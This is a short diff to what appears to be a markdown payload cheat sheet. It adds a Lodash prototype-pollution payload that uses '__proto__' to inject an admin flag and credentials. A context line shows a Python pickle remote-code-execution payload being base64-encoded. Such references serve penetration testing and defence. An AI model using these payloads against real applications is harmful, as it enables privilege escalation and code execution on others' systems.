@@ -112,4 +112,5 @@ p = base64.b64encode(pickle.dumps(RCE())).decode()
 
 - **Lodash**
   - `{"constructor": {"prototype": {"admin": True}}}`
+  - `{"__proto__": {"name": "user", "password": "pass", "admin": True}}`
   
